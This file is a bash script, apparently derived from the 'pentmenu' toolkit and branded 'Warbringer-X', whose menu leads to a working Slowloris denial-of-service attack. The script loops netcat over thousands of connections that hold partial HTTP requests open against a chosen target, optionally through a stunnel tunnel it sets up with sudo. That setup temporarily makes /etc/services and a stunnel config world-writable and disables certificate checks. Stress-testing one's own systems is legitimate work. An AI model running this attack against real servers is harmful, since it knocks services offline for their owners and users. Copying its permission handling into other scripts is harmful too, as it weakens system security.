#set the prompt to show you are in Warbringer-X and not standard shell
PS3="Warbringer>"

##MAINMENU##
##################
##START MAINMENU##
mainmenu()
{
#build a main menu using bash select
#from here, the various sub menus can be selected and from them, modules can be run
mainmenu=("DOS" "Quit")
select opt in "${mainmenu[@]}"; do
	if [ "$opt" = "Quit" ]; then
	echo "Quitting...Thank you for using Warbringer-X!" && sleep 1
	exit 0
	elif [ "$opt" = "DOS" ]; then
dosmenu
	else
#if no valid option is chosen, chastise the user
	echo "That's not a valid option! Hit Return to show main menu"
	fi
done
}
##END MAINMENU##
################
##/MAINMENU##





##DOS##
#################
##START DOSMENU##
dosmenu()
{
#display a menu for the DOS module using bash select
		dosmenu=("Slowloris" "Go back")
	select dosopt in "${dosmenu[@]}"; do
#Slowloris
	if [ "$dosopt" = "Slowloris" ]; then
		slowloris
#Go back
	elif [ "$dosopt" = "Go back" ]; then
		mainmenu
	else
#Default if no valid menu option selected is to return an error
  	echo  "That's not a valid option! Hit Return to show menu"
	fi
done
}
##END DOSMENU##
###############




##################
##START SLOWLORIS##
slowloris()
{ echo "Using netcat for Slowloris attack...." && sleep 1
echo "Enter target:"
#need a target IP or hostname
	read -i $TARGET -e TARGET
echo "Target is set to $TARGET"
#need a target port
echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#how many connections should we attempt to open with the target?
#there is no hard limit, it depends on available resources.  Default is 2000 simultaneous connections
echo "Enter number of connections to open (default 2000):"
		read CONNS
	: ${CONNS:=2000}
#ensure a valid integer is entered
	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
CONNS=2000 && echo "Invalid integer!  Using 2000 connections"
	fi
#how long do we wait between sending header lines?
#too long and the connection will likely be closed
#too short and our connections have little/no effect on server
#either too long or too short is bad.  Default random interval is a sane choice
echo "Choose interval between sending headers."
echo "Default is [r]andom, between 5 and 15 seconds, or enter interval in seconds:"
	read INTERVAL
	: ${INTERVAL:=r}
	if [[ "$INTERVAL" = "r" ]]
then
#if default (random) interval is chosen, generate a random value between 5 and 15
#note that this module uses $RANDOM to generate random numbers, it is sufficient for our needs
INTERVAL=$((RANDOM % 11 + 5))
#check that r (random) or a valid number is entered
	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
then
#if not r (random) or valid number is chosen for interval, assume r (random)
INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value between 5 and 15 seconds"
	fi
#run stunnel_client function
stunnel_client
if [[ "$SSL" = "y" ]]
then
#if SSL is chosen, set the attack to go through local stunnel listener
echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
echo "Opened $CONNS connections....returning to menu"
else
#if SSL is not chosen, launch the attack on the server without using a local listener
echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
#return to menu once requested number of connections has been opened or resources are exhausted
echo "Opened $CONNS connections....returning to menu"
fi
}
##END SLOWLORIS##
#################



##GENERIC##
#################
##START STUNNEL##
stunnel_client()
{ echo "use SSL/TLS? [y]es or [n]o (default):"
	read SSL
	: ${SSL:=n}
#if not using SSL/TLS, carry on what we were doing
#otherwise create an SSL/TLS tunnel using a local listener on TCP port 9991
if [[ "$SSL" = "y" ]]
	then echo "Using SSL/TLS"
LHOST=127.0.0.1
LPORT=9991
#ascertain if stunnel is defined in /etc/services and if not, add it & set permissions correctly
grep -q $LPORT /etc/services
if [[ $? = 1 ]]
then
echo "Adding pentmenu stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
fi
#is ss is available, use that to shoew listening ports
if test -f "/bin/ss"; then
	LISTPORT=ss;
#otherwise use netstat
	else LISTPORT=netstat
fi
#show listening ports and check for port 9991
$LISTPORT -tln |grep -q $LPORT
if [[ "$?" = "1" ]]
#if nothing is running on port 9991, create stunnel configuration
then
	echo "Creating stunnel client on $LHOST:$LPORT"
		sudo rm -f /etc/stunnel/pentmenu.conf;
		sudo touch /etc/stunnel/pentmenu.conf && sudo chmod 777 /etc/stunnel/pentmenu.conf
		sudo echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
		sudo echo "client=yes" >> /etc/stunnel/pentmenu.conf
		sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
		sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
		sudo echo "verify=0" >> /etc/stunnel/pentmenu.conf
		sudo chmod 644 /etc/stunnel/pentmenu.conf
		sudo stunnel /etc/stunnel/pentmenu.conf && sleep 1
#if stunnel listener is already active we don't bother recreating it
else echo "Looks like stunnel is already listening on port 9991, so not recreating"
fi
fi }
##END STUNNEL##
###############
##/GENERIC##


##WELCOME##
#########################
##START WELCOME MESSAGE##
#everything before this is a function and functions have to be defined before they can be used
#so the welcome message MUST be placed at the end of the script
echo "<== = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ==>"
echo " "
echo '$$\      $$\  $$$$$$\  $$$$$$$\  $$$$$$$\  $$$$$$$\  $$$$$$\ $$\   $$\  $$$$$$\  $$$$$$$$\ $$$$$$$\                      $$\   $$\ '
echo '$$ | $\  $$ |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ \_$$  _|$$$\  $$ |$$  __$$\ $$  _____|$$  __$$\                     $$ |  $$ |'
echo '$$ |$$$\ $$ |$$ /  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |  $$$$\ $$ |$$ /  \__|$$ |      $$ |  $$ |                    \$$\ $$  |'
echo '$$ $$ $$\$$ |$$$$$$$$ |$$$$$$$  |$$$$$$$\ |$$$$$$$  |  $$ |  $$ $$\$$ |$$ |$$$$\ $$$$$\    $$$$$$$  |      $$$$$$\        \$$$$  / '
echo '$$$$  _$$$$ |$$  __$$ |$$  __$$< $$  __$$\ $$  __$$<   $$ |  $$ \$$$$ |$$ |\_$$ |$$  __|   $$  __$$<       \______|       $$  $$<  '
echo '$$$  / \$$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |  $$ |\$$$ |$$ |  $$ |$$ |      $$ |  $$ |                    $$  /\$$\ '
echo '$$  /   \$$ |$$ |  $$ |$$ |  $$ |$$$$$$$  |$$ |  $$ |$$$$$$\ $$ | \$$ |\$$$$$$  |$$$$$$$$\ $$ |  $$ |                    $$ /  $$ |'
echo '\__/     \__|\__|  \__|\__|  \__|\_______/ \__|  \__|\______|\__|  \__| \______/ \________|\__|  \__|                    \__|  \__|'
echo ""
echo "Welcome to Warbringer-X!"

echo "This software is only for responsible, authorised use."
echo "YOU are responsible for your own actions!"
mainmenu
##END WELCOME MESSAGE##
#######################
##/WELCOME##
